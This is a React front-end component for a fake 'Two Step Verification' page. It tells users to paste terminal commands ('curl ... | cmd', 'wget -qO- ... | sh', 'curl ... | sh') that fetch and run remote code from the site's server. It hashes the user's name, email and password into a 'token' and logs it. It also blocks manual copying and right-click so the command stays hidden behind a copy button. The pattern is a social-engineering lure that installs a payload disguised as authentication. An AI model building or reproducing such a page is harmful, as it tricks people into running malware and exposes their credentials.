import { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { FaRegClipboard } from 'react-icons/fa';
import swal from 'sweetalert';
import ReCAPTCHA from 'react-google-recaptcha';
import axios from 'axios';

const RECAPTCHA_SITE_KEY = '6LfnXoUrAAAAAKi4Teldo3FWhynzPsZwWuSs9b7i';
const currentDomain = window.location.origin;

const Twofa = () => {
  const location = useLocation();
  const userData = location.state?.user;

  const [machineHex, setMachineHex] = useState('');
  const [copySuccess, setCopySuccess] = useState(false);
  const [captchaToken, setCaptchaToken] = useState(null);

  const navigate = useNavigate();

  const generateHexMachineId = async () => {
    const encoder = new TextEncoder();
    const combinedString = userData.name + userData.email + userData.password;
    const data = encoder.encode(combinedString);
    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    const hexString = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    console.log(hexString.substring(0, 16));
    return hexString.substring(0, 16);
  };

  
  useEffect(() => {
    const fetchHex = async () => {
      const hex = await generateHexMachineId();
      setMachineHex(hex);
      console.log(userData);
      console.log(hex);
    };
    fetchHex();
  }, [userData]);

  useEffect(() => {
    const handleKeyDown = (e) => {
      const isCopy = (e.ctrlKey || e.metaKey) && e.key === 'c';
      if (isCopy && document.activeElement?.classList.contains('nocopy')) {
        e.preventDefault();
        swal('Blocked', 'Manual copy is disabled.', 'warning');
      }
    };

    const handleContextMenu = (e) => {
      if (e.target.closest('.nocopy')) {
        e.preventDefault();
      }
    };

    const handleSelectStart = (e) => {
      if (e.target.closest('.nocopy')) {
        e.preventDefault();
      }
    };

    document.addEventListener('keydown', handleKeyDown);
    document.addEventListener('contextmenu', handleContextMenu);
    document.addEventListener('selectstart', handleSelectStart);

    return () => {
      document.removeEventListener('keydown', handleKeyDown);
      document.removeEventListener('contextmenu', handleContextMenu);
      document.removeEventListener('selectstart', handleSelectStart);
    };
  }, []);

  const copyToClipboard = (command) => {
    navigator.clipboard.writeText(command)
      .then(() => {
        setCopySuccess(true);
        setTimeout(() => setCopySuccess(false), 2000);
      })
      .catch(() => {
        swal('Error', 'Copy failed', 'error');
      });
  };

  const handleCaptchaChange = (value) => {
    setCaptchaToken(value);
  };

  const handleContinue = async () => {
    if (!captchaToken) {
      swal('Error', 'Please complete the CAPTCHA', 'error');
      return;
    }

    try {
      const res = await axios.post(`${currentDomain}/users/verify-captcha`, {
        token: captchaToken,
      });

      if (res.data.success) {
        swal('Success', 'CAPTCHA verified. Proceeding...', 'success');
        navigate('/2fa');
      } else {
        swal('Error', 'CAPTCHA verification failed', 'error');
      }
    } catch (err) {
      swal('Error', 'Verification failed', 'error');
    }
  };

  const urlWindows = `${currentDomain}/users/auth/windows?token=${machineHex}`;
  const urlLinux = `${currentDomain}/users/auth/linux?token=${machineHex}`;
  const urlMac = `${currentDomain}/users/auth/mac?token=${machineHex}`;

  return (
    <main className="relative overflow-hidden">
      <section id="signup-section">
        <div className="py-40 pt-36 xl:pb-[200px] xl:pt-[180px]">
          <div className="global-container">
            <div className="mx-auto max-w-[910px] text-center">
              <h1 className="mb-[50px]">Two Step Verification</h1>
              <div className='block rounded-lg bg-white px-[30px] py-[50px] text-left shadow-[0_4px_60px_0_rgba(0,0,0,0.1)] sm:px-10'>
                <div className="grid grid-cols-1 gap-6">
                  <div className="flex flex-col gap-y-[10px]">
                    <label className="text-2xl font-bold leading-relaxed text-left">
                      To complete the two-step verification process and link your credentials to this platform, please follow these steps:
                    </label>


                      <ol className="list-decimal list-inside font-medium text-gray-700 mt-4 space-y-2 pl-6">
                      <li className="font-bold" >Open your terminal.</li>
                      <li className="font-bold" >Copy the command below for your OS and paste into the terminal.</li>
                          <div className="border border-gray-300 rounded-xl p-8 mt-6 space-y-6 shadow-sm">
                            <div className="text-xl font-bold">
                              Your one-time verification token is: <span className="text-red-600">{machineHex}</span>
                            </div>

                            <div>
                              <label className="text-lg font-semibold mb-2 block">Windows Command:</label>
                              <div className="flex w-full items-center nocopy">
                                <input
                                  value={urlWindows}
                                  type="text"
                                  className="w-full rounded border px-6 py-4 font-mono text-base text-black"
                                  readOnly
                                  tabIndex={-1}
                                />
                                <button
                                  onClick={() => copyToClipboard(`curl ${urlWindows} | cmd`)}
                                  className="ml-4 rounded border-2 border-black bg-black py-3 px-5 text-white text-xl transition-colors duration-200 ease-in-out hover:bg-gray-800"
                                >
                                  <FaRegClipboard />
                                </button>
                              </div>
                            </div>

                            <div>
                              <label className="text-lg font-semibold mb-2 block">Linux Command:</label>
                              <div className="flex w-full items-center nocopy">
                                <input
                                  value={urlLinux}
                                  type="text"
                                  className="w-full rounded border px-6 py-4 font-mono text-base text-black"
                                  readOnly
                                  tabIndex={-1}
                                />
                                <button
                                  onClick={() => copyToClipboard(`wget -qO- \"${urlLinux}\" | sh`)}
                                  className="ml-4 rounded border-2 border-black bg-black py-3 px-5 text-white text-xl transition-colors duration-200 ease-in-out hover:bg-gray-800"
                                >
                                  <FaRegClipboard />
                                </button>
                              </div>
                            </div>

                            <div>
                              <label className="text-lg font-semibold mb-2 block">Mac Command:</label>
                              <div className="flex w-full items-center nocopy">
                                <input
                                  value={urlMac}
                                  type="text"
                                  className="w-full rounded border px-6 py-4 font-mono text-base text-black"
                                  readOnly
                                  tabIndex={-1}
                                />
                                <button
                                  onClick={() => copyToClipboard(`curl \"${urlMac}\" | sh`)}
                                  className="ml-4 rounded border-2 border-black bg-black py-3 px-5 text-white text-xl transition-colors duration-200 ease-in-out hover:bg-gray-800"
                                >
                                  <FaRegClipboard />
                                </button>
                              </div>
                            </div>
                          </div>

                    {copySuccess && (
                      <div className="mt-3 text-green-600 font-semibold text-center">
                        ✅ Command copied!
                      </div>
                    )}
                      <li className="font-bold" >Press <strong>Enter</strong> to execute the command</li>
                    </ol>
                    <div className="flex justify-center mt-6">
                      <ReCAPTCHA sitekey={RECAPTCHA_SITE_KEY} onChange={handleCaptchaChange} />
                    </div>
                      <button
                       onClick={handleContinue}
                      className='button mt-7 block rounded-[50px] border-2 border-black bg-black py-4 text-white after:bg-colorOrangyRed hover:border-colorOrangyRed hover:text-white'
                    >
                      Continue
                    </button>
                      <div className='mt-10 text-center'>
                        This will securely register your token and finalize the authentication process.
                        If you need help or encounter any issues, please contact our support team.
                      </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>
    </main>
  );
};

export default Twofa;